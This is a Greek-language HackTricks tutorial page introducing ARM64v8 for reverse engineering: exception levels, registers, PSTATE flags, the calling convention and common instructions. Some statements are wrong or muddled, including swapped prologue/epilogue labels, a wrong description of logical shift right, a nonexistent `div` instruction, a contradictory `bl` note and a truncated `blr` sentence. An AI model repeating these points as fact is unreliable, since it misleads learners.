# Εισαγωγή στο ARM64v8

{{#include ../../../banners/hacktricks-training.md}}


## **Exception Levels - EL (ARM64v8)**

Στην αρχιτεκτονική ARMv8, τα επίπεδα εκτέλεσης, γνωστά ως Exception Levels (EL), καθορίζουν το επίπεδο προνομίων και τις δυνατότητες του περιβάλλοντος εκτέλεσης. Υπάρχουν τέσσερα exception levels, από EL0 έως EL3, καθένα από τα οποία εξυπηρετεί διαφορετικό σκοπό:

1. **EL0 - User Mode**:
- Αυτό είναι το επίπεδο με τα λιγότερα προνόμια και χρησιμοποιείται για την εκτέλεση κανονικού κώδικα εφαρμογών.
- Οι εφαρμογές που εκτελούνται στο EL0 είναι απομονωμένες μεταξύ τους και από το λογισμικό του συστήματος, ενισχύοντας την ασφάλεια και τη σταθερότητα.
2. **EL1 - Operating System Kernel Mode**:
- Οι περισσότεροι πυρήνες λειτουργικών συστημάτων εκτελούνται σε αυτό το επίπεδο.
- Το EL1 έχει περισσότερα προνόμια από το EL0 και μπορεί να προσπελάσει πόρους του συστήματος, αλλά με ορισμένους περιορισμούς για τη διασφάλιση της ακεραιότητας του συστήματος. Η μετάβαση από το EL0 στο EL1 γίνεται με την εντολή SVC.
3. **EL2 - Hypervisor Mode**:
- Αυτό το επίπεδο χρησιμοποιείται για virtualization. Ένας hypervisor που εκτελείται στο EL2 μπορεί να διαχειρίζεται πολλά λειτουργικά συστήματα (καθένα στο δικό του EL1), τα οποία εκτελούνται στο ίδιο φυσικό hardware.
- Το EL2 παρέχει δυνατότητες για την απομόνωση και τον έλεγχο των virtualized περιβαλλόντων.
- Επομένως, εφαρμογές virtual machines όπως το Parallels μπορούν να χρησιμοποιούν το `hypervisor.framework` για να αλληλεπιδρούν με το EL2 και να εκτελούν virtual machines χωρίς να χρειάζονται kernel extensions.
- Για τη μετάβαση από το EL1 στο EL2 χρησιμοποιείται η εντολή `HVC`.
4. **EL3 - Secure Monitor Mode**:
- Αυτό είναι το πιο προνομιούχο επίπεδο και χρησιμοποιείται συχνά για secure boot και trusted execution environments.
- Το EL3 μπορεί να διαχειρίζεται και να ελέγχει τις προσβάσεις μεταξύ secure και non-secure καταστάσεων (όπως secure boot, trusted OS κ.λπ.).
- Χρησιμοποιούνταν για το KPP (Kernel Patch Protection) στο macOS, αλλά πλέον δεν χρησιμοποιείται.
- Το EL3 δεν χρησιμοποιείται πλέον από την Apple.
- Η μετάβαση στο EL3 πραγματοποιείται συνήθως με την εντολή `SMC` (Secure Monitor Call).

Η χρήση αυτών των επιπέδων επιτρέπει έναν δομημένο και ασφαλή τρόπο διαχείρισης διαφορετικών πτυχών του συστήματος, από τις εφαρμογές χρηστών έως το πιο προνομιούχο software του συστήματος. Η προσέγγιση του ARMv8 στα επίπεδα προνομίων βοηθά στην αποτελεσματική απομόνωση των διαφορετικών components του συστήματος, ενισχύοντας έτσι την ασφάλεια και την ανθεκτικότητά του.

## **Registers (ARM64v8)**

Το ARM64 διαθέτει **31 general-purpose registers**, με ονομασίες από `x0` έως `x30`. Καθένα μπορεί να αποθηκεύσει μια τιμή **64-bit** (8-byte). Για πράξεις που απαιτούν μόνο τιμές 32-bit, τα ίδια registers μπορούν να προσπελαστούν σε 32-bit mode, χρησιμοποιώντας τα ονόματα w0 έως w30.

1. **`x0`** έως **`x7`** - Χρησιμοποιούνται συνήθως ως scratch registers και για τη μεταβίβαση παραμέτρων σε subroutines.
- Το **`x0`** περιέχει επίσης τα δεδομένα επιστροφής μιας function
2. **`x8`** - Στον Linux kernel, το `x8` χρησιμοποιείται ως ο αριθμός system call για την εντολή `svc`. **Στο macOS χρησιμοποιείται το x16!**
3. **`x9`** έως **`x15`** - Περισσότερα temporary registers, που χρησιμοποιούνται συχνά για local variables.
4. **`x16`** και **`x17`** - **Intra-procedural Call Registers**. Temporary registers για immediate values. Χρησιμοποιούνται επίσης για indirect function calls και PLT (Procedure Linkage Table) stubs.
- Το **`x16`** χρησιμοποιείται ως ο **αριθμός system call** για την εντολή **`svc`** στο **macOS**.
5. **`x18`** - **Platform register**. Μπορεί να χρησιμοποιηθεί ως general-purpose register, αλλά σε ορισμένες πλατφόρμες είναι δεσμευμένο για platform-specific χρήσεις: δείκτης στο current thread environment block στα Windows ή δείκτης στη **δομή executing task του linux kernel**.
6. **`x19`** έως **`x28`** - Είναι callee-saved registers. Μια function πρέπει να διατηρεί τις τιμές αυτών των registers για τον caller της, επομένως αποθηκεύονται στο stack και ανακτώνται πριν από την επιστροφή στον caller.
7. **`x29`** - **Frame pointer** για την παρακολούθηση του stack frame. Όταν δημιουργείται νέο stack frame επειδή καλείται μια function, το register **`x29` αποθηκεύεται στο stack** και η διεύθυνση του **νέου** frame pointer (η διεύθυνση του **`sp`**) **αποθηκεύεται σε αυτό το register**.
- Αυτό το register μπορεί επίσης να χρησιμοποιηθεί ως **general-purpose register**, αν και συνήθως χρησιμοποιείται ως αναφορά σε **local variables**.
8. **`x30`** ή **`lr`**- **Link register**. Περιέχει τη **return address** όταν εκτελείται μια εντολή `BL` (Branch with Link) ή `BLR` (Branch with Link to Register), αποθηκεύοντας την τιμή του **`pc`** σε αυτό το register.
- Μπορεί επίσης να χρησιμοποιηθεί όπως οποιοδήποτε άλλο register.
- Αν η τρέχουσα function πρόκειται να καλέσει μια νέα function και επομένως να αντικαταστήσει το `lr`, το αποθηκεύει στο stack στην αρχή. Αυτό είναι το epilogue (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Αποθήκευση των `fp` και `lr`, δημιουργία χώρου και λήψη νέου `fp`) και το ανακτά στο τέλος. Αυτό είναι το prologue (`ldp x29, x30, [sp], #48; ret` -> Ανάκτηση των `fp` και `lr` και επιστροφή).
9. **`sp`** - **Stack pointer**, που χρησιμοποιείται για την παρακολούθηση της κορυφής του stack.
- Η τιμή του **`sp`** πρέπει πάντα να διατηρείται τουλάχιστον σε **quadword** **alignment**, διαφορετικά μπορεί να προκύψει alignment exception.
10. **`pc`** - **Program counter**, ο οποίος δείχνει στην επόμενη εντολή. Αυτό το register μπορεί να ενημερωθεί μόνο μέσω exception generations, exception returns και branches. Οι μόνες ordinary instructions που μπορούν να διαβάσουν αυτό το register είναι οι branch with link instructions (BL, BLR), για να αποθηκεύσουν τη διεύθυνση του **`pc`** στο **`lr`** (Link Register).
11. **`xzr`** - **Zero register**. Ονομάζεται επίσης **`wzr`** στη **32**-bit μορφή register. Μπορεί να χρησιμοποιηθεί για εύκολη λήψη της μηδενικής τιμής (συνηθισμένη πράξη) ή για συγκρίσεις με χρήση του **`subs`**, όπως **`subs XZR, Xn, #10`**, αποθηκεύοντας τα δεδομένα που προκύπτουν πουθενά (στο **`xzr`**).

Τα **`Wn`** registers είναι η **32-bit** έκδοση του **`Xn`** register.

> [!TIP]
> Τα registers από X0 έως X18 είναι volatile, δηλαδή οι τιμές τους μπορούν να αλλάξουν από function calls και interrupts. Αντίθετα, τα registers από X19 έως X28 είναι non-volatile, δηλαδή οι τιμές τους πρέπει να διατηρούνται κατά τη διάρκεια function calls ("callee saved").

### SIMD και Floating-Point Registers

Επιπλέον, υπάρχουν άλλα **32 registers μήκους 128-bit**, τα οποία μπορούν να χρησιμοποιηθούν σε optimized single instruction multiple data (SIMD) operations και για την εκτέλεση floating-point arithmetic. Ονομάζονται Vn registers, αν και μπορούν επίσης να λειτουργούν σε **64**-bit, **32**-bit, **16**-bit και **8**-bit, οπότε ονομάζονται **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** και **`Bn`**.

### System Registers

**Υπάρχουν εκατοντάδες system registers**, τα οποία ονομάζονται επίσης special-purpose registers (SPRs) και χρησιμοποιούνται για την **παρακολούθηση** και τον **έλεγχο** της συμπεριφοράς των **processors**.\
Μπορούν να διαβαστούν ή να οριστούν μόνο με τις ειδικές dedicated instructions **`mrs`** και **`msr`**.

Τα special registers **`TPIDR_EL0`** και **`TPIDDR_EL0`** συναντώνται συχνά κατά το reverse engineering. Το suffix `EL0` υποδεικνύει το **ελάχιστο exception level** από το οποίο είναι δυνατή η πρόσβαση στο register (σε αυτήν την περίπτωση, το EL0 είναι το κανονικό exception (privilege) level με το οποίο εκτελούνται τα κανονικά προγράμματα).\
Χρησιμοποιούνται συχνά για την αποθήκευση της **base address της περιοχής thread-local storage** στη μνήμη. Συνήθως το πρώτο είναι readable και writable για προγράμματα που εκτελούνται στο EL0, ενώ το δεύτερο μπορεί να διαβαστεί από το EL0 και να γραφτεί από το EL1 (όπως ο kernel).

- `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
- `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`

### **PSTATE**

Το **PSTATE** περιέχει αρκετά process components, τα οποία σειριοποιούνται στο **`SPSR_ELx`** special register που είναι ορατό από το operating system, όπου X είναι το **permission** **level του exception που ενεργοποιήθηκε** (αυτό επιτρέπει την ανάκτηση της κατάστασης του process όταν ολοκληρωθεί το exception).\
Τα προσβάσιμα fields είναι τα εξής:

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- Τα condition flags **`N`**, **`Z`**, **`C`** και **`V`**:
- Το **`N`** σημαίνει ότι η πράξη παρήγαγε αρνητικό αποτέλεσμα
- Το **`Z`** σημαίνει ότι η πράξη παρήγαγε μηδενικό αποτέλεσμα
- Το **`C`** σημαίνει ότι η πράξη παρήγαγε carry
- Το **`V`** σημαίνει ότι η πράξη παρήγαγε signed overflow:
- Το άθροισμα δύο θετικών αριθμών παράγει αρνητικό αποτέλεσμα.
- Το άθροισμα δύο αρνητικών αριθμών παράγει θετικό αποτέλεσμα.
- Στην αφαίρεση, όταν ένας μεγάλος αρνητικός αριθμός αφαιρείται από έναν μικρότερο θετικό αριθμό (ή το αντίστροφο) και το αποτέλεσμα δεν μπορεί να αναπαρασταθεί εντός του εύρους του δεδομένου μεγέθους bit.
- Προφανώς ο processor δεν γνωρίζει αν η πράξη είναι signed ή unsigned, επομένως ελέγχει τα C και V στις operations και υποδεικνύει αν προέκυψε carry στην περίπτωση που ήταν signed ή unsigned.

> [!WARNING]
> Δεν ενημερώνουν όλες οι instructions αυτά τα flags. Ορισμένες, όπως οι **`CMP`** ή **`TST`**, το κάνουν, όπως και άλλες που έχουν suffix s, όπως η **`ADDS`**.

- Το τρέχον **register width (`nRW`) flag**: Αν το flag έχει την τιμή 0, το πρόγραμμα θα εκτελεστεί σε AArch64 execution state μετά την επαναφορά του.
- Το τρέχον **Exception Level** (**`EL`**): Ένα κανονικό πρόγραμμα που εκτελείται στο EL0 θα έχει την τιμή 0
- Το **single stepping** flag (**`SS`**): Χρησιμοποιείται από debuggers για single stepping, ορίζοντας το SS flag σε 1 μέσα στο **`SPSR_ELx`** μέσω ενός exception. Το πρόγραμμα θα εκτελέσει ένα step και θα προκαλέσει single step exception.
- Το **illegal exception** state flag (**`IL`**): Χρησιμοποιείται για να σημειώνει πότε privileged software εκτελεί μη έγκυρη μεταφορά exception level. Το flag ορίζεται σε 1 και ο processor προκαλεί illegal state exception.
- Τα **`DAIF`** flags: Αυτά τα flags επιτρέπουν σε ένα privileged πρόγραμμα να κάνει επιλεκτικό mask σε συγκεκριμένα external exceptions.
- Αν το **`A`** είναι 1, σημαίνει ότι θα ενεργοποιούνται **asynchronous aborts**. Το **`I`** ρυθμίζει την απόκριση σε εξωτερικά hardware **Interrupts Requests** (IRQs), ενώ το F σχετίζεται με **Fast Interrupt Requests** (FIRs).
- Τα **stack pointer select** flags (**`SPS`**): Privileged προγράμματα που εκτελούνται στο EL1 και άνω μπορούν να εναλλάσσονται μεταξύ του δικού τους stack pointer register και εκείνου του user model (π.χ. μεταξύ `SP_EL1` και `EL0`). Η εναλλαγή πραγματοποιείται με εγγραφή στο **`SPSel`** special register. Αυτό δεν μπορεί να γίνει από το EL0.

## **Calling Convention (ARM64v8)**

Το ARM64 calling convention καθορίζει ότι οι **πρώτες οκτώ παράμετροι** μιας function περνούν στα registers **`x0`** έως **`x7`**. Οι **επιπλέον** παράμετροι περνούν στο **stack**. Η **return** τιμή περνά πίσω στο register **`x0`** ή και στο **`x1`** **αν έχει μήκος 128 bits**. Τα registers **`x19`** έως **`x30`** και το **`sp`** πρέπει να **διατηρούνται** κατά τη διάρκεια function calls.

Όταν διαβάζετε μια function σε assembly, αναζητήστε το **function prologue και epilogue**. Το **prologue** συνήθως περιλαμβάνει την **αποθήκευση του frame pointer (`x29`)**, τη ρύθμιση ενός **νέου frame pointer** και την **κατανομή χώρου στο stack**. Το **epilogue** συνήθως περιλαμβάνει την **επαναφορά του αποθηκευμένου frame pointer** και την **επιστροφή** από τη function.

### Calling Convention in Swift

Η Swift έχει το δικό της **calling convention**, το οποίο βρίσκεται στο [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Common Instructions (ARM64v8)**

Οι ARM64 instructions έχουν γενικά τη **μορφή `opcode dst, src1, src2`**, όπου το **`opcode`** είναι η **operation** που θα εκτελεστεί (όπως `add`, `sub`, `mov` κ.λπ.), το **`dst`** είναι το **destination** register όπου θα αποθηκευτεί το αποτέλεσμα και τα **`src1`** και **`src2`** είναι τα **source** registers. Μπορούν επίσης να χρησιμοποιηθούν immediate values στη θέση των source registers.

- **`mov`**: **Μετακινεί** μια τιμή από ένα **register** σε άλλο.
- Example: `mov x0, x1` — Μετακινεί την τιμή από το `x1` στο `x0`.
- **`ldr`**: **Φορτώνει** μια τιμή από τη **μνήμη** σε ένα **register**.
- Example: `ldr x0, [x1]` — Φορτώνει στο `x0` μια τιμή από τη θέση μνήμης που υποδεικνύει το `x1`.
- **Offset mode**: Ένα offset που επηρεάζει τον αρχικό pointer υποδεικνύεται, για παράδειγμα:
- `ldr x2, [x1, #8]`, φορτώνει στο x2 την τιμή από το x1 + 8
- `ldr x2, [x0, x1, lsl #2]`, φορτώνει στο x2 ένα object από το array x0, στη θέση x1 (index) \* 4
- **Pre-indexed mode**: Εφαρμόζει calculations στο origin, λαμβάνει το αποτέλεσμα και αποθηκεύει επίσης το νέο origin στο origin.
- `ldr x2, [x1, #8]!`, φορτώνει το `x1 + 8` στο `x2` και αποθηκεύει στο x1 το αποτέλεσμα του `x1 + 8`
- `str lr, [sp, #-4]!`, Αποθηκεύει το link register στο sp και ενημερώνει το register sp
- **Post-index mode**: Είναι παρόμοιο με το προηγούμενο, αλλά η memory address προσπελαύνεται πρώτα και έπειτα υπολογίζεται και αποθηκεύεται το offset.
- `ldr x0, [x1], #8`, φορτώνει το `x1` στο `x0` και ενημερώνει το x1 με `x1 + 8`
- **PC-relative addressing**: Σε αυτήν την περίπτωση, η address προς φόρτωση υπολογίζεται relative στο PC register
- `ldr x1, =_start`, Φορτώνει στο x1 τη διεύθυνση όπου ξεκινά το `_start` symbol, σε σχέση με το τρέχον PC.
- **`str`**: **Αποθηκεύει** μια τιμή από ένα **register** στη **μνήμη**.
- Example: `str x0, [x1]` — Αποθηκεύει την τιμή του `x0` στη θέση μνήμης που υποδεικνύει το `x1`.
- **`ldp`**: **Load Pair of Registers**. Αυτή η instruction **φορτώνει δύο registers** από **διαδοχικές θέσεις μνήμης**. Η memory address σχηματίζεται συνήθως προσθέτοντας ένα offset στην τιμή κάποιου άλλου register.
- Example: `ldp x0, x1, [x2]` — Φορτώνει τα `x0` και `x1` από τις θέσεις μνήμης `x2` και `x2 + 8` αντίστοιχα.
- **`stp`**: **Store Pair of Registers**. Αυτή η instruction **αποθηκεύει δύο registers** σε **διαδοχικές θέσεις μνήμης**. Η memory address σχηματίζεται συνήθως προσθέτοντας ένα offset στην τιμή κάποιου άλλου register.
- Example: `stp x0, x1, [sp]` — Αποθηκεύει τα `x0` και `x1` στις θέσεις μνήμης `sp` και `sp + 8` αντίστοιχα.
- `stp x0, x1, [sp, #16]!` — Αποθηκεύει τα `x0` και `x1` στις θέσεις μνήμης `sp+16` και `sp + 24` αντίστοιχα και ενημερώνει το `sp` με `sp+16`.
- **`add`**: **Προσθέτει** τις τιμές δύο registers και αποθηκεύει το αποτέλεσμα σε ένα register.
- Syntax: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> Προορισμός
- Xn2 -> Operand 1
- Xn3 | #imm -> Operand 2 (register ή immediate)
- \[shift #N | RRX] -> Εκτέλεση shift ή κλήση RRX
- Example: `add x0, x1, x2` — Προσθέτει τις τιμές των `x1` και `x2` και αποθηκεύει το αποτέλεσμα στο `x0`.
- `add x5, x5, #1, lsl #12` — Αυτό ισούται με 4096 (ένα 1 μετατοπισμένο 12 φορές) -> 1 0000 0000 0000 0000
- **`adds`** Εκτελεί ένα `add` και ενημερώνει τα flags
- **`sub`**: **Αφαιρεί** τις τιμές δύο registers και αποθηκεύει το αποτέλεσμα σε ένα register.
- Δείτε το **`add`** **syntax**.
- Example: `sub x0, x1, x2` — Αφαιρεί την τιμή του `x2` από το `x1` και αποθηκεύει το αποτέλεσμα στο `x0`.
- **`subs`** Είναι όπως το sub, αλλά ενημερώνει το flag
- **`mul`**: **Πολλαπλασιάζει** τις τιμές **δύο registers** και αποθηκεύει το αποτέλεσμα σε ένα register.
- Example: `mul x0, x1, x2` — Πολλαπλασιάζει τις τιμές των `x1` και `x2` και αποθηκεύει το αποτέλεσμα στο `x0`.
- **`div`**: **Διαιρεί** την τιμή ενός register με ένα άλλο και αποθηκεύει το αποτέλεσμα σε ένα register.
- Example: `div x0, x1, x2` — Διαιρεί την τιμή του `x1` με την τιμή του `x2` και αποθηκεύει το αποτέλεσμα στο `x0`.
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
- **Logical shift left**: Προσθέτει 0 στο τέλος, μετακινώντας τα υπόλοιπα bits προς τα εμπρός (πολλαπλασιασμός επί n φορές το 2)
- **Logical shift right**: Προσθέτει 1 στην αρχή, μετακινώντας τα υπόλοιπα bits προς τα πίσω (διαίρεση διά n φορές το 2 σε unsigned)
- **Arithmetic shift right**: Όπως το **`lsr`**, αλλά αντί να προσθέτει 0, αν το most significant bit είναι 1, προστίθενται **1** (διαίρεση διά n φορές το 2 σε signed)
- **Rotate right**: Όπως το **`lsr`**, αλλά ό,τι αφαιρείται από τα δεξιά προστίθεται στα αριστερά
- **Rotate Right with Extend**: Όπως το **`ror`**, αλλά με το carry flag ως το "most significant bit". Έτσι, το carry flag μετακινείται στο bit 31 και το bit που αφαιρείται μετακινείται στο carry flag.
- **`bfm`**: **Bit Field Move**. Αυτές οι operations **αντιγράφουν bits `0...n`** από μια τιμή και τα τοποθετούν στις θέσεις **`m..m+n`**. Το **`#s`** καθορίζει τη θέση του **αριστερότερου bit** και το **`#r`** το ποσό του rotate right.
- Bitfield move: `BFM Xd, Xn, #r`
- Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
- Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
- **Bitfield Extract and Insert:** Αντιγράφει ένα bitfield από ένα register και το αντιγράφει σε άλλο register.
- **`BFI X1, X2, #3, #4`** Εισάγει 4 bits από το X2, ξεκινώντας από το 3ο bit του X1
- **`BFXIL X1, X2, #3, #4`** Εξάγει τέσσερα bits από το 3ο bit του X2 και τα αντιγράφει στο X1
- **`SBFIZ X1, X2, #3, #4`** Κάνει sign-extend σε 4 bits από το X2 και τα εισάγει στο X1, ξεκινώντας από τη θέση bit 3 και μηδενίζοντας τα δεξιά bits
- **`SBFX X1, X2, #3, #4`** Εξάγει 4 bits ξεκινώντας από το bit 3 του X2, κάνει sign-extend σε αυτά και τοποθετεί το αποτέλεσμα στο X1
- **`UBFIZ X1, X2, #3, #4`** Κάνει zero-extend σε 4 bits από το X2 και τα εισάγει στο X1, ξεκινώντας από τη θέση bit 3 και μηδενίζοντας τα δεξιά bits
- **`UBFX X1, X2, #3, #4`** Εξάγει 4 bits ξεκινώντας από το bit 3 του X2 και τοποθετεί το zero-extended αποτέλεσμα στο X1.
- **Sign Extend To X:** Επεκτείνει το πρόσημο (ή προσθέτει μόνο 0 στη unsigned έκδοση) μιας τιμής, ώστε να είναι δυνατή η εκτέλεση operations με αυτή:
- **`SXTB X1, W2`** Επεκτείνει το πρόσημο ενός byte **από το W2 στο X1** (`W2` είναι το μισό του `X2`) ώστε να συμπληρωθούν τα 64bits
- **`SXTH X1, W2`** Επεκτείνει το πρόσημο ενός αριθμού 16bit **από το W2 στο X1** ώστε να συμπληρωθούν τα 64bits
- **`SXTW X1, W2`** Επεκτείνει το πρόσημο ενός byte **από το W2 στο X1** ώστε να συμπληρωθούν τα 64bits
- **`UXTB X1, W2`** Προσθέτει 0 (unsigned) σε ένα byte **από το W2 στο X1** ώστε να συμπληρωθούν τα 64bits
- **`extr`:** Εξάγει bits από ένα καθορισμένο **ζεύγος concatenated registers**.
- Example: `EXTR W3, W2, W1, #3` Αυτό θα κάνει **concat τα W1+W2** και θα λάβει **από το bit 3 του W2 έως το bit 3 του W1**, αποθηκεύοντάς τα στο W3.
- **`cmp`**: **Συγκρίνει** δύο registers και ορίζει τα condition flags. Είναι **alias του `subs`**, ορίζοντας το destination register στο zero register. Χρήσιμο για να γνωρίζουμε αν `m == n`.
- Υποστηρίζει το **ίδιο syntax με το `subs`**
- Example: `cmp x0, x1` — Συγκρίνει τις τιμές των `x0` και `x1` και ορίζει ανάλογα τα condition flags.
- **`cmn`**: **Compare negative** operand. Σε αυτήν την περίπτωση είναι **alias του `adds`** και υποστηρίζει το ίδιο syntax. Χρήσιμο για να γνωρίζουμε αν `m == -n`.
- **`ccmp`**: Conditional comparison. Είναι μια σύγκριση που εκτελείται μόνο αν μια προηγούμενη σύγκριση ήταν true και ορίζει συγκεκριμένα τα nzcv bits.
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> αν x1 != x2 και x3 < x4, άλμα στο func
- Αυτό συμβαίνει επειδή το **`ccmp`** εκτελείται μόνο αν το **προηγούμενο `cmp` ήταν `NE`**. Αν δεν ήταν, τα bits `nzcv` ορίζονται σε 0 (κάτι που δεν ικανοποιεί τη σύγκριση `blt`).
- Αυτό μπορεί επίσης να χρησιμοποιηθεί ως `ccmn` (ίδιο με negative, όπως `cmp` έναντι `cmn`).
- **`tst`**: Ελέγχει αν οποιεσδήποτε από τις τιμές της σύγκρισης είναι και οι δύο 1 (λειτουργεί όπως ένα ANDS χωρίς να αποθηκεύει το αποτέλεσμα πουθενά). Είναι χρήσιμο για τον έλεγχο ενός register με μια τιμή και για να διαπιστωθεί αν κάποιο από τα bits του register που υποδεικνύονται στην τιμή είναι 1.
- Example: `tst X1, #7` Ελέγχει αν κάποιο από τα 3 τελευταία bits του X1 είναι 1
- **`teq`**: XOR operation που απορρίπτει το αποτέλεσμα
- **`b`**: Unconditional Branch
- Example: `b myFunction`
- Σημειώστε ότι αυτό δεν θα συμπληρώσει το link register με τη return address (δεν είναι κατάλληλο για subroutine calls που πρέπει να επιστρέψουν)
- **`bl`**: **Branch** with link, χρησιμοποιείται για την **κλήση** μιας **subroutine**. Αποθηκεύει τη **return address στο `x30`**.
- Example: `bl myFunction` — Καλεί τη function `myFunction` και αποθηκεύει τη return address στο `x30`.
- Σημειώστε ότι αυτό δεν θα συμπληρώσει το link register με τη return address (δεν είναι κατάλληλο για subroutine calls που πρέπει να επιστρέψουν)
- **`blr`**: **Branch** with Link to Register, χρησιμοποιείται για την **κλήση** μιας **subroutine**, όπου ο προορισμός **καθορίζεται** σε ένα **register**. Αποθηκεύει τη return address στο `x30`. (Αυτό είναι
- Example: `blr x1` — Καλεί τη function της οποίας η address περιέχεται στο `x1` και αποθηκεύει τη return address στο `x30`.
- **`ret`**: **Επιστρέφει** από **subroutine**, χρησιμοποιώντας συνήθως τη διεύθυνση στο **`x30`**.
- Example: `ret` — Επιστρέφει από την τρέχουσα subroutine χρησιμοποιώντας τη return address στο `x30`.
- **`b.<cond>`**: Conditional branches
- **`b.eq`**: **Branch if equal**, με βάση την προηγούμενη instruction `cmp`.
- Example: `b.eq label` — Αν η προηγούμενη instruction `cmp` διαπίστωσε ότι δύο τιμές είναι ίσες, πραγματοποιείται άλμα στο `label`.
- **`b.ne`**: **Branch if Not Equal**. Αυτή η instruction ελέγχει τα condition flags (τα οποία ορίστηκαν από προηγούμενη comparison instruction) και, αν οι συγκρινόμενες τιμές δεν ήταν ίσες, πραγματοποιεί branch σε label ή address.
- Example: Μετά από μια instruction `cmp x0, x1`, η `b.ne label` — Αν οι τιμές των `x0` και `x1` δεν ήταν ίσες, πραγματοποιείται άλμα στο `label`.
- **`cbz`**: **Compare and Branch on Zero**. Αυτή η instruction συγκρίνει ένα register με το μηδέν και, αν είναι ίσα, πραγματοποιεί branch σε label ή address.
- Example: `cbz x0, label` — Αν η τιμή του `x0` είναι μηδέν, πραγματοποιείται άλμα στο `label`.
- **`cbnz`**: **Compare and Branch on Non-Zero**. Αυτή η instruction συγκρίνει ένα register με το μηδέν και, αν δεν είναι ίσα, πραγματοποιεί branch σε label ή address.
- Example: `cbnz x0, label` — Αν η τιμή του `x0` δεν είναι μηδενική, πραγματοποιείται άλμα στο `label`.
- **`tbnz`**: Test bit and branch on nonzero
- Example: `tbnz x0, #8, label`
- **`tbz`**: Test bit and branch on zero
- Example: `tbz x0, #8, label`
- **Conditional select operations**: Είναι operations των οποίων η συμπεριφορά μεταβάλλεται ανάλογα με τα conditional bits.
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Αν είναι true, X0 = X1, αν είναι false, X0 = X2
- `csinc Xd, Xn, Xm, cond` -> Αν είναι true, Xd = Xn, αν είναι false, Xd = Xm + 1
- `cinc Xd, Xn, cond` -> Αν είναι true, Xd = Xn + 1, αν είναι false, Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> Αν είναι true, Xd = Xn, αν είναι false, Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> Αν είναι true, Xd = NOT(Xn), αν είναι false, Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> Αν είναι true, Xd = Xn, αν είναι false, Xd = - Xm
- `cneg Xd, Xn, cond` -> Αν είναι true, Xd = - Xn, αν είναι false, Xd = Xn
- `cset Xd, Xn, Xm, cond` -> Αν είναι true, Xd = 1, αν είναι false, Xd = 0
- `csetm Xd, Xn, Xm, cond` -> Αν είναι true, Xd = \<all 1>, αν είναι false, Xd = 0
- **`adrp`**: Υπολογίζει τη **page address ενός symbol** και την αποθηκεύει σε ένα register.
- Example: `adrp x0, symbol` — Υπολογίζει τη page address του `symbol` και την αποθηκεύει στο `x0`.
- **`ldrsw`**: **Φορτώνει** μια signed **32-bit** τιμή από τη μνήμη και κάνει **sign-extend σε 64** bits. Χρησιμοποιείται για συνηθισμένες περιπτώσεις SWITCH.
- Example: `ldrsw x0, [x1]` — Φορτώνει μια signed 32-bit τιμή από τη θέση μνήμης που υποδεικνύει το `x1`, κάνει sign-extend σε 64 bits και την αποθηκεύει στο `x0`.
- **`stur`**: **Αποθηκεύει την τιμή ενός register σε θέση μνήμης**, χρησιμοποιώντας offset από άλλο register.
- Example: `stur x0, [x1, #4]` — Αποθηκεύει την τιμή του `x0` στη memory address που είναι 4 bytes μεγαλύτερη από τη διεύθυνση που βρίσκεται τώρα στο `x1`.
- **`svc`** : Εκτελεί ένα **system call**. Είναι συντομογραφία του "Supervisor Call". Όταν ο processor εκτελεί αυτήν την instruction, **μεταβαίνει από user mode σε kernel mode** και μεταβαίνει σε συγκεκριμένη θέση μνήμης όπου βρίσκεται ο κώδικας **χειρισμού system calls του kernel**.

- Example:

```armasm
mov x8, 93  ; Load the system call number for exit (93) into register x8.
mov x0, 0   ; Load the exit status code (0) into register x0.
svc 0       ; Make the system call.
```

### **Function Prologue**

1. **Αποθήκευση του link register και του frame pointer στο stack**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **Ρύθμιση του νέου frame pointer**: `mov x29, sp` (ρυθμίζει το νέο frame pointer για την τρέχουσα συνάρτηση)
3. **Δέσμευση χώρου στο stack για τοπικές μεταβλητές** (αν απαιτείται): `sub sp, sp, <size>` (όπου το `<size>` είναι ο αριθμός των απαιτούμενων bytes)

### **Επίλογος συνάρτησης**

1. **Αποδέσμευση των τοπικών μεταβλητών** (αν είχε γίνει δέσμευση): `add sp, sp, <size>`
2. **Επαναφορά του link register και του frame pointer**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Return**: `ret` (επιστρέφει τον έλεγχο στον caller χρησιμοποιώντας τη διεύθυνση στον link register)

## Common Memory Protections του ARM

{{#ref}}
../../../binary-exploitation/ios-exploiting/README.md
{{#endref}}

## Κατάσταση εκτέλεσης AARCH32

Το Armv8-A υποστηρίζει την εκτέλεση προγραμμάτων 32-bit. Το **AArch32** μπορεί να εκτελείται σε ένα από τα **δύο instruction sets**: **`A32`** και **`T32`**, και μπορεί να πραγματοποιεί εναλλαγή μεταξύ τους μέσω **`interworking`**.\
Τα **Privileged** προγράμματα 64-bit μπορούν να προγραμματίζουν την **εκτέλεση προγραμμάτων 32-bit** εκτελώντας μια μεταφορά exception level στο χαμηλότερο privileged 32-bit.\
